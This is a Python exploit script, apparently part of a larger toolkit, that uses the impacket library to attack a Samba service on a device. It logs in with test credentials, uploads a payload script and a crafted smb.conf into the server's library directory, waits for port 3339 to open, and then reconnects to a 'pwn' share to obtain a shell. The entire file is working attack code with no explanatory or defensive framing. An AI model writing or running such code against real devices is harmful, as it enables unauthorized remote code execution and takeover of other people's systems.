from impacket.examples.smbclient import MiniImpacketShell
from impacket.smbconnection import SMBConnection
from time import sleep
from functions import checkopenport

def samba_pwn(host,nousb):
    print("[Samba_pwn]: Waiting 2 seconds for server startup...")
    sleep(2)
    print("[Samba_pwn]: Connecting")
    smbClient = SMBConnection(host, host, sess_port=int(445))
    smbClient.login("test", "test", "", "", "")
    shell = MiniImpacketShell(smbClient)
    shell.onecmd("use samba")
    print("[Samba_pwn]: Uploading payload.sh")
    if nousb == False:
        shell.onecmd("cd /usb1_1_1")
    shell.onecmd("put payload.sh")
    print("[Samba_pwn]: Uploading test.smb.conf")
    if nousb == True:
        shell.onecmd("cd /raiz/var/samba/lib")
    else:
        shell.onecmd("cd /usb1_1_1/raiz/var/samba/lib")
    shell.onecmd("put test.smb.conf")
    print("[Samba_pwn]: Waiting for port 3339/tcp to be opened",end="")
    while checkopenport() != True:
        sleep(1)
        print(".",end="")
    print()
    print("[Samba_pwn]: Opening shell")
    smbClient2 = SMBConnection(host, host, sess_port=int(445))
    smbClient2.login("test", "test", "", "", "")
    shell2 = MiniImpacketShell(smbClient2)
    shell2.onecmd("use pwn")


